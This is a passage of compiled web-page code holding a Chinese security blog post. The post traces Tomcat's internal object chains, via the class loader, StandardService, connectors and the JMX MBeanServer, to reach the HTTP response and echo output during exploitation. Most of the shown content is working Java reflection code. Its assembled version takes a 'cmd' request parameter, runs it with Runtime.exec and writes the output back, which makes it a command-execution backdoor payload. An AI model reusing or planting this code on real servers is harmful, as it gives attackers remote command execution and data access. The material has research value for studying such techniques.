ff0cprocessor\u8fd9\u4e2a\u65f6\u5019\u4e5f\u662fnull\uff0c\u8fd9\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u4e0a\u9762\u8bf4\u7684"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209155109438",src:r(22597).A+"",width:"2118",height:"342"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4e00\u76f4\u5f80\u540e\u8ddf\uff0c\u5728798\u884c\u7684\u65f6\u5019\u4f1a\u5bf9",(0,t.jsx)(n.code,{children:"processor"}),"\u8fdb\u884c\u8d4b\u503c\uff0c\u8c03\u7528",(0,t.jsx)(n.code,{children:"this.getProtocol().createProcessor();"}),"\u6765\u83b7\u5f97\u7684"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209155231759",src:r(43023).A+"",width:"3532",height:"952"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8d4b\u503c\u540e\u4f1a\u8fdb\u5165",(0,t.jsx)(n.code,{children:"register"}),"\u51fd\u6570\u5bf9",(0,t.jsx)(n.code,{children:"processor"}),"\u8fdb\u884c\u4e00\u4e9b\u5904\u7406\uff0c\u91cd\u70b9\u4e5f\u5728\u8fd9"]}),"\n",(0,t.jsxs)(n.p,{children:["\u8ddf\u8fdb\u6ce8\u518c\u51fd\u6570\uff0c\u53d1\u73b0\u53d8\u91cfrp\u662f",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u7c7b\uff0c\u800c\u901a\u8fc7",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u7c7b\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"request"}),"\uff0c\u540e\u7eed\u4e5f\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"response"}),"\u4e86"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:"rp.req.getResponse()\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209165017817",src:r(22297).A+"",width:"3584",height:"2240"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u7740\u91cd\u5173\u6ce8\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u5bf9\u8c61",(0,t.jsx)(n.code,{children:"rp"}),"\uff0c\u4ece\u540e\u9762\u7684\u5185\u5bb9\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u4e3b\u8981\u67092\u4e2a\u5730\u65b9\uff1a"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\u7b2c\u4e00\u5904\u4f1a\u901a\u8fc7",(0,t.jsx)(n.code,{children:"rp.setGlobalProcessor(global)"}),"\u8bbe\u7f6e\u5230global\u4e2d\uff0c\u5177\u4f53\u53ef\u4ee5\u770b\u4ee3\u7801"]}),"\n",(0,t.jsxs)(n.li,{children:["\u7b2c\u4e8c\u5904\u4f1a\u901a\u8fc7",(0,t.jsx)(n.code,{children:"Registry.getRegistry(null, null).registerComponent(rp,rpName, null);"}),"\u6ce8\u518c\u5230\u5176\u4ed6\u5730\u65b9"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209165207236",src:r(60299).A+"",width:"3416",height:"1904"})}),"\n",(0,t.jsx)(n.p,{children:"\u6240\u4ee5\u60f3\u8981\u6784\u9020\u94fe\uff0c\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\u5bfb\u627e\u83b7\u53d6",(0,t.jsx)(n.code,{children:"global"}),"\u7684\u65b9\u6cd5"]}),"\n",(0,t.jsxs)(n.li,{children:["\u8ddf\u8e2a",(0,t.jsx)(n.code,{children:"Registry.registerComponent()"}),"\u6d41\u7a0b\uff0c\u67e5\u770b\u5177\u4f53\u7684",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u5bf9\u8c61\u88ab\u6ce8\u518c\u5230\u4ec0\u4e48\u5730\u65b9\u4e86"]}),"\n"]}),"\n",(0,t.jsx)(n.h4,{id:"\u83b7\u53d6global",children:"\u83b7\u53d6global"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"\u5148\u653e\u4e0b\u6574\u6761\u94fe\u7684\u7ed3\u679c\uff1a"}),"\n",(0,t.jsx)(n.p,{children:"Thread.currentThread().getContextClassLoader()->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->processors->RequestInfo->req->response"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"global"}),"\u53d8\u91cf\u662f",(0,t.jsx)(n.code,{children:"AbstractProtocol"}),"\u9759\u6001\u5185\u90e8\u7c7b",(0,t.jsx)(n.code,{children:"ConnectionHandler"}),"\u7684\u6210\u5458\u53d8\u91cf\uff1b\u4e0d\u662fstatic\u9759\u6001\u53d8\u91cf\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u627e\u5b58\u50a8",(0,t.jsx)(n.code,{children:"AbstractProtocol"}),"\u7c7b\u6216",(0,t.jsx)(n.code,{children:"AbstractProtocol"}),"\u5b50\u7c7b\u3002\u73b0\u5728\u7684\u5229\u7528\u94fe\u4e3a"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5206\u6790\u7ee7\u627f\u5173\u7cfb\uff0c\u53d1\u73b0\u5b83\u6709\u5b50\u7c7b",(0,t.jsx)(n.code,{children:"Http11NioProtocol"}),"\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u83b7\u53d6\u5230\u8fd9\u4e2a\u7c7b\uff0c\u90a3\u4e48\u4e5f\u80fd\u83b7\u53d6\u5230global"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209171115093",src:r(16407).A+"",width:"1158",height:"430"})}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsxs)(n.p,{children:["Tomcat\u521d\u59cb\u5316",(0,t.jsx)(n.code,{children:"StandardService"}),"\u65f6\uff0c\u4f1a\u542f\u52a8",(0,t.jsx)(n.code,{children:"Container"}),"\u3001",(0,t.jsx)(n.code,{children:"Executor"}),"\u3001",(0,t.jsx)(n.code,{children:"mapperListener"}),"\u53ca\u6240\u6709\u7684",(0,t.jsx)(n.code,{children:"Connector"}),"\u3002\u5176\u4e2d",(0,t.jsx)(n.code,{children:"Executor"}),"\u8d1f\u8d23\u4e3a",(0,t.jsx)(n.code,{children:"Connector"}),"\u5904\u7406\u8bf7\u6c42\u63d0\u4f9b\u5171\u7528\u7684\u7ebf\u7a0b\u6c60\uff0c",(0,t.jsx)(n.code,{children:"mapperListener"}),"\u8d1f\u8d23\u5c06\u8bf7\u6c42\u6620\u5c04\u5230\u5bf9\u5e94\u7684\u5bb9\u5668\u4e2d\uff0c",(0,t.jsx)(n.code,{children:"Connector"}),"\u8d1f\u8d23\u63a5\u6536\u548c\u89e3\u6790\u8bf7\u6c42\u3002\u6240\u4ee5\u5bf9\u4e8e\u5355\u4e2a\u8bf7\u6c42\u6765\u8bf4\uff0c\u5176\u76f8\u5173\u7684\u4fe1\u606f\u53ca\u8c03\u7528\u5173\u7cfb\u90fd\u4fdd\u5b58\u5728",(0,t.jsx)(n.code,{children:"Connector"}),"\u5bf9\u8c61\u4e2d"]})}),"\n",(0,t.jsxs)(n.p,{children:["\u5206\u6790\u8c03\u7528\u6808\uff0c\u53d1\u73b0\u5b58\u5728\u8fd9\u4e2a\u7c7b\uff0c",(0,t.jsx)(n.code,{children:"org.apache.catalina.connector.CoyoteAdapter#connector"}),"\u7684",(0,t.jsx)(n.code,{children:"protocolHandler"}),"\u5c5e\u6027\u503c\u7c7b\u5c31\u662f",(0,t.jsx)(n.code,{children:"Http11NioProtocol"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209171449493",src:r(21129).A+"",width:"2414",height:"1470"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:"((AbstractProtocol.ConnectionHandler) ((Http11NioProtocol) connector.protocolHandler).handler).global.processors.get(0).req.getResponse()\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u73b0\u5728\u7684\u601d\u8def\u662f\u5982\u4f55\u83b7\u53d6\u5230\u8fd9\u4e2a",(0,t.jsx)(n.code,{children:"connector"}),"\uff0c\u65b0\u7684\u5229\u7528\u94fe"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Litch1\u5e08\u5085\u5206\u6790\u51fa\u5728Tomcat\u542f\u52a8\u8fc7\u7a0b\u4e2d\u4f1a\u521b\u5efaconnector\u5bf9\u8c61\uff0c\u5e76\u901a\u8fc7",(0,t.jsx)(n.code,{children:"org.apache.catalina.core.StandardService#addConnector"}),"\u5b58\u653e\u5728",(0,t.jsx)(n.code,{children:"connectors"}),"\u4e2d"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"org.apache.catalina.startup.Tomcat#setConnector",src:r(84138).A+"",width:"1328",height:"566"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u901a\u8fc7",(0,t.jsx)(n.code,{children:"org.apache.catalina.core.StandardService#initInternal"}),"\u8fdb\u884c\u521d\u59cb\u5316"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220209173933442",src:r(66323).A+"",width:"1464",height:"1258"})}),"\n",(0,t.jsxs)(n.p,{children:["\u56e0\u4e3a\u5148\u6dfb\u52a0\u4e86\u518d\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u8fd9\u4e2a\u65f6\u8981\u83b7\u53d6",(0,t.jsx)(n.code,{children:"connectors"}),"\uff0c\u53ef\u4ee5\u901a\u8fc7",(0,t.jsx)(n.code,{children:"org.apache.catalina.core.StandardService"}),"\u6765\u83b7\u53d6"]}),"\n",(0,t.jsx)(n.p,{children:"\u6240\u4ee5\u5229\u7528\u94fe"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->req->response\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u6700\u540e\u5c31\u662f\u5982\u4f55\u83b7\u5f97",(0,t.jsx)(n.code,{children:"StandardService"}),"\u4e86\uff0c\u8fd9\u91cc\u5229\u7528\u7684\u662ftomcat\u653e\u5f03\u4e86\u53cc\u4eb2\u59d4\u6d3e\u6a21\u578b\u7684\u601d\u8def"]}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"\u53cc\u4eb2\u59d4\u6d3e\u673a\u5236\u7684\u7f3a\u70b9\uff1a\u5f53\u52a0\u8f7d\u540c\u4e2ajar\u5305\u4e0d\u540c\u7248\u672c\u5e93\u7684\u65f6\u5019\uff0c\u8be5\u673a\u5236\u65e0\u6cd5\u81ea\u52a8\u9009\u62e9\u9700\u8981\u7248\u672c\u5e93\u7684jar\u5305\u3002\u7279\u522b\u662f\u5f53Tomcat\u7b49web\u5bb9\u5668\u627f\u8f7d\u4e86\u591a\u4e2a\u4e1a\u52a1\u4e4b\u540e\uff0c\u4e0d\u80fd\u6709\u6548\u7684\u52a0\u8f7d\u4e0d\u540c\u7248\u672c\u5e93\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cTomcat\u653e\u5f03\u4e86\u53cc\u4eb2\u59d4\u6d3e\u6a21\u578b\u3002"}),(0,t.jsxs)(n.p,{children:["Tomcat\u52a0\u8f7d\u673a\u5236\u7b80\u5355\u8bb2\uff0c",(0,t.jsx)(n.code,{children:"WebAppClassLoader"}),"\u8d1f\u8d23\u52a0\u8f7d\u672c\u8eab\u7684\u76ee\u5f55\u4e0b\u7684class\u6587\u4ef6\uff0c\u52a0\u8f7d\u4e0d\u5230\u65f6\u518d\u4ea4\u7ed9",(0,t.jsx)(n.code,{children:"CommonClassLoader"}),"\u52a0\u8f7d\uff0c\u8fd9\u548c\u53cc\u4eb2\u59d4\u6d3e\u521a\u597d\u76f8\u53cd\u3002"]})]}),"\n",(0,t.jsxs)(n.p,{children:["\u901a\u8fc7",(0,t.jsx)(n.code,{children:"Thread.currentThread().getContextClassLoader()"}),"\u6765\u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u7684",(0,t.jsx)(n.code,{children:"ClassLoader"}),"\uff0c\u518d\u4ece",(0,t.jsx)(n.code,{children:"resources->context->context"}),"\u5f53\u4e2d\u5bfb\u627e\u5373\u53ef\u3002"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210094109672",src:r(93935).A+"",width:"948",height:"1170"})}),"\n",(0,t.jsx)(n.p,{children:"\u6240\u4ee5\u6700\u7ec8\u7684\u624b\u6cd5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"Thread.currentThread().getContextClassLoader()->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->processors->RequestInfo->req->response\n"})}),"\n",(0,t.jsx)(n.h4,{id:"global\u94fe\u8def\u4ee3\u7801",children:"global\u94fe\u8def\u4ee3\u7801"}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u5c3d\u53ef\u80fd\u7684\u627e\u5230\u80fd\u591f\u76f4\u63a5\u901a\u8fc7\u51fd\u6570\u83b7\u53d6\u5230\u60f3\u8981\u7684\u6570\u636e\uff0c\u5b9e\u5728\u4e0d\u884c\u518d\u4f7f\u7528\u53cd\u5c04"})}),"\n",(0,t.jsxs)(n.p,{children:["1\u3001\u83b7\u53d6",(0,t.jsx)(n.code,{children:"StandardContext"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:"org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\nStandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();\n"})}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"Thread.currentThread().getContextClassLoader().getClass()"}),"\u7684\u503c\u4e3a",(0,t.jsx)(n.code,{children:"org.apache.catalina.loader.ParallelWebappClassLoader"}),"\uff0c\u5b83\u7ee7\u627f\u4e86",(0,t.jsx)(n.code,{children:"WebappClassLoaderBase"}),"\uff0c\u800c",(0,t.jsx)(n.code,{children:"resources"}),"\u53d8\u91cf\u662f",(0,t.jsx)(n.code,{children:"WebappClassLoaderBase"}),"\u7c7b\u4e2d\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u5982\u679c\u4e5f\u60f3\u4f7f\u7528\u53cd\u5c04\u7684\u8bdd\uff0c\u9700\u8981\u5982\u4e0b\uff1a"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'// \u83b7\u53d6 StandardContext\nClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\nField resources = org.apache.catalina.loader.WebappClassLoaderBase.class.getDeclaredField("resources");\nresources.setAccessible(true);\norg.apache.catalina.webresources.StandardRoot standardRoot = (StandardRoot) resources.get(contextClassLoader);\nStandardContext standardContext = (StandardContext) standardRoot.getContext();\n'})}),"\n",(0,t.jsxs)(n.p,{children:["2\u3001\u83b7\u53d6",(0,t.jsx)(n.code,{children:"StandardContext"}),"\u4e2d\u7684",(0,t.jsx)(n.code,{children:"context"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'Field context = standardContext.getClass().getDeclaredField("context");\ncontext.setAccessible(true);\norg.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210100818723",src:r(8551).A+"",width:"948",height:"1170"})}),"\n",(0,t.jsxs)(n.p,{children:["3\u3001\u83b7\u53d6",(0,t.jsx)(n.code,{children:"context"}),"\u4e2d\u7684",(0,t.jsx)(n.code,{children:"service"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'Field service = applicationContext.getClass().getDeclaredField("service");\nservice.setAccessible(true);\norg.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext);\n'})}),"\n",(0,t.jsxs)(n.p,{children:["4\u3001\u83b7\u53d6",(0,t.jsx)(n.code,{children:"service"}),"\u4e2d\u7684",(0,t.jsx)(n.code,{children:"connectors"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'Field connectors = standardService.getClass().getDeclaredField("connectors");\nconnectors.setAccessible(true);\norg.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService);\n'})}),"\n",(0,t.jsxs)(n.p,{children:["5\u3001\u53cd\u5c04\u83b7\u53d6 ",(0,t.jsx)(n.code,{children:"AbstractProtocol$ConnectoinHandler"})," \u5b9e\u4f8b"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();\nField handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");\nhandler.setAccessible(true);\norg.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);\n'})}),"\n",(0,t.jsxs)(n.p,{children:["6\u3001\u53cd\u5c04\u83b7\u53d6",(0,t.jsx)(n.code,{children:"global"}),"\u5185\u90e8\u7684",(0,t.jsx)(n.code,{children:"processors"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal();\nField processors = requestGroupInfo.getClass().getDeclaredField("processors");\nprocessors.setAccessible(true);\nArrayList<org.apache.coyote.RequestInfo> processors1 = (ArrayList) processors.get(requestGroupInfo);\n'})}),"\n",(0,t.jsxs)(n.p,{children:["7\u3001\u83b7\u53d6",(0,t.jsx)(n.code,{children:"response"}),"\u8f93\u51fa\u5185\u5bb9"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'Field req = RequestInfo.class.getDeclaredField("req");\nreq.setAccessible(true);\nfor (org.apache.coyote.RequestInfo requestInfo : processors1) {\n    org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);\n\t// \u8f6c\u6362\u4e3a org.apache.catalina.connector.Request \u7c7b\u578b\n\torg.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);\n\torg.apache.catalina.connector.Response response1 = request2.getResponse();\n\tPrintWriter writer = response1.getWriter();\n\twriter.write("tomcat echo");\n\twriter.flush();\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u4ee3\u7801\u6c47\u603b\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'// \u83b7\u53d6 StandardContext\n        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();\n\n        try {\n            // \u53cd\u5c04\u83b7\u53d6StandardContext\u4e2d\u7684context\n            Field context = standardContext.getClass().getDeclaredField("context");\n            context.setAccessible(true);\n            org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);\n\n            // \u53cd\u5c04\u83b7\u53d6context\u4e2d\u7684service\n            Field service = applicationContext.getClass().getDeclaredField("service");\n            service.setAccessible(true);\n            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext);\n\n            // \u53cd\u5c04\u83b7\u53d6service\u4e2d\u7684connectors\n            Field connectors = standardService.getClass().getDeclaredField("connectors");\n            connectors.setAccessible(true);\n            org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService);\n\n            // \u53cd\u5c04\u83b7\u53d6 AbstractProtocol$ConnectoinHandler \u5b9e\u4f8b\n            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();\n            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");\n            handler.setAccessible(true);\n            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);\n\n            // \u53cd\u5c04\u83b7\u53d6global\u5185\u90e8\u7684processors\n            org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal();\n            Field processors = requestGroupInfo.getClass().getDeclaredField("processors");\n            processors.setAccessible(true);\n            ArrayList<org.apache.coyote.RequestInfo> processors1 = (ArrayList) processors.get(requestGroupInfo);\n\n            // \u83b7\u53d6response\u4fee\u6539\u6570\u636e\n            // \u4e0b\u9762\u5faa\u73af\uff0c\u53ef\u4ee5\u5728\u8fd9\u5148\u83b7\u53d6req\u5b9e\u4f8b\uff0c\u907f\u514d\u6bcf\u6b21\u5faa\u73af\u90fd\u53cd\u5c04\u83b7\u53d6\u4e00\u6b21\n            Field req = RequestInfo.class.getDeclaredField("req");\n            req.setAccessible(true);\n            for (org.apache.coyote.RequestInfo requestInfo : processors1) {\n                org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);\n                // \u8f6c\u6362\u4e3a org.apache.catalina.connector.Request \u7c7b\u578b\n                org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);\n                org.apache.catalina.connector.Response response1 = request2.getResponse();\n\n                // \u83b7\u53d6\u53c2\u6570\n                PrintWriter writer = response1.getWriter();\n                String cmd = request2.getParameter("cmd");\n                if (cmd != null) {\n                    Process exec = Runtime.getRuntime().exec(cmd);\n                    InputStream inputStream = exec.getInputStream();\n                    DataInputStream dataInputStream = new DataInputStream(inputStream);\n                    String disr = dataInputStream.readLine();\n                    while ( disr != null ) {\n                        writer.write(disr);\n                        disr = dataInputStream.readLine();\n                    }\n                }\n                writer.flush();\n\n                }\n            } catch (IllegalAccessException illegalAccessException) {\n            illegalAccessException.printStackTrace();\n        } catch (NoSuchFieldException noSuchFieldException) {\n            noSuchFieldException.printStackTrace();\n        }\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6548\u679c"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210114240691",src:r(12049).A+"",width:"1100",height:"156"})}),"\n",(0,t.jsxs)(n.h4,{id:"\u8ddf\u8e2aregistryregistercomponent",children:["\u8ddf\u8e2a",(0,t.jsx)(n.code,{children:"Registry.registerComponent()"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u8ddf\u8fdb",(0,t.jsx)(n.code,{children:"org.apache.tomcat.util.modeler.Registry#registerComponent(java.lang.Object, javax.management.ObjectName, java.lang.String)"}),"\u8fd9\u4e2a\u51fd\u6570\uff0c\u53d1\u73b0\u4f1a\u7ed9",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u5bf9\u8c61\u6ce8\u518c\u5230",(0,t.jsx)(n.code,{children:"MBeanServer"}),"\u4e2d"]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"oname"}),"\u7684\u503c\u4e3a",(0,t.jsx)(n.code,{children:'Tomcat:name=HttpRequest1,type=RequestProcessor,worker="http-nio-8080"'})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210124145698",src:r(80003).A+"",width:"3414",height:"1366"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u5982\u679c\u80fd\u901a\u8fc7",(0,t.jsx)(n.code,{children:"MBeanServer"}),"\u6765\u83b7\u53d6\u5230\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u4f1a\u66f4\u52a0\u7684\u65b9\u4fbf\u76f4\u63a5"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5206\u6790\u4e00\u4e0b\uff0c\u901a\u8fc7",(0,t.jsx)(n.code,{children:"Registry#getMBeanServer()"}),"\u51fd\u6570\u80fd\u591f\u76f4\u63a5\u83b7\u53d6\u5230",(0,t.jsx)(n.code,{children:"MBeanServer"}),"\u5b9e\u4f8b"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210124548884",src:r(63133).A+"",width:"1746",height:"1018"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u73b0\u5728\u95ee\u9898\u662f\u600e\u4e48\u62ff\u5230",(0,t.jsx)(n.code,{children:"org.apache.tomcat.util.modeler.Registry"}),"\u8fd9\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff0c\u6211\u4eec\u8fd8\u662f\u5206\u6790\u4e00\u4e0b\u5e94\u7528\u662f\u600e\u4e48\u62ff\u5230\u7684\uff0c\u7136\u540e\u6a21\u62df\u4e00\u4e0b\u5373\u53ef"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5b83\u662f\u76f4\u63a5\u4f7f\u7528",(0,t.jsx)(n.code,{children:"Registry.getRegistry(null, null)"}),"\u6765\u83b7\u53d6\u7684"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210125302698",src:r(2853).A+"",width:"2248",height:"1244"})}),"\n",(0,t.jsxs)(n.p,{children:["\u6240\u4ee5\u6211\u4eec\u4e5f\u6a21\u62df\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u53d8\u91cf",(0,t.jsx)(n.code,{children:".getClass"}),"\u662f\u4ec0\u4e48\u7c7b\u6211\u4eec\u5c31\u7ed9\u4ed6\u8f6c\u6362\u4e3a\u4ec0\u4e48\u7c7b\u5373\u53ef"]}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:["\u5982",(0,t.jsx)(n.code,{children:"jmxMBeanServer.mbsInterceptor.getClass()"}),"\u7684\u7c7b\u662f",(0,t.jsx)(n.code,{children:"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"}),"\uff0c\u6211\u4eec\u5c31\u7ed9\u4ed6\u8f6c\u6362\u8fc7\u53bb\u5373\u53ef"]}),"\n",(0,t.jsxs)(n.p,{children:["\u8001\u5b9e\u8bf4",(0,t.jsx)(n.code,{children:"MBeanServer"}),"\u5230",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\u7684\u8fc7\u7a0b\u8fd8\u662f\u6709\u70b9\u96be\u627e\uff0c\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u5565\u5feb\u7684\u529e\u6cd5\uff0c\u8fd8\u662f\u5927\u4f6c\u4eec\u725b\u903c"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();\ncom.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) jmxMBeanServer.mbsInterceptor;\ncom.sun.jmx.mbeanserver.Repository repository = defaultMBeanServerInterceptor.repository;\nrepository.query(new ObjectName("*:type=GlobalRequestProcessor,name=\\"http*\\""), null);\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20220210131031927",src:r(24356).A+"",width:"2514",height:"1154"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8fd9\u91cc\u7531\u4e8e\u6d4b\u8bd5\u7684\u5173\u7cfb\u53ea\u5b58\u5728\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5728\u5177\u4f53\u6784\u9020\u65f6\u53ef\u4ee5\u76f4\u63a5\u904d\u5386\u6240\u6709\u7b26\u5408\u6761\u4ef6\u7684\u60c5\u51b5\u3002\u6709\u4e86",(0,t.jsx)(n.code,{children:"RequestInfo"}),"\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u62ff\u5230",(0,t.jsx)(n.code,{children:"response"}),"\u5b8c\u6210\u56de\u663e\u4e86"]}),"\n",(0,t.jsx)(n.p,{children:"\u5229\u7528\u94fe\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"jmxMBeanServer->resource\uff08\u548c\u4e0a\u9762\u7684global\u4e00\u6837\uff09->->processors->RequestInfo->req->response\n"})}),"\n",(0,t.jsx)(n.h4,{id:"mbeanserver\u94fe\u8def\u4ee3\u7801",children:"MBeanServer\u94fe\u8def\u4ee3\u7801"}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u4e2a\u6bd4\u